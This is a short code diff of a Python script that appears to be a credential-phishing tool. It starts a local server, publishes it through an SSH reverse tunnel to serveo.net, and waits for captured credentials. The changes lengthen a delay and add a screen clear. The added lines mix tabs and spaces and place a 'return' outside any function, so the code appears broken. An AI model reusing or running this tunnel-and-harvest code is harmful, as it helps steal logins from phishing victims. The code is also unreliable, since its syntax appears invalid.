@@ -285,7 +285,7 @@ def runPEnv():
     
 def serveo():
     system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > sendlink.txt 2> /dev/null & ')
-    sleep(4)
+    sleep(10)
     f = open('sendlink.txt', 'r')
     a = ['[32m', 'Forwarding', 'HTTP', 'traffic', 'from', '[0m', ' ']
     lst = []
@@ -333,7 +333,8 @@ if __name__ == "__main__":
                 elif choice == '2':
                     serveo()
                 else:
-                	return server()
+                	system('clear')
+                    return server()
         server()
         multiprocessing.Process(target=runServer).start()
         waitCreds()
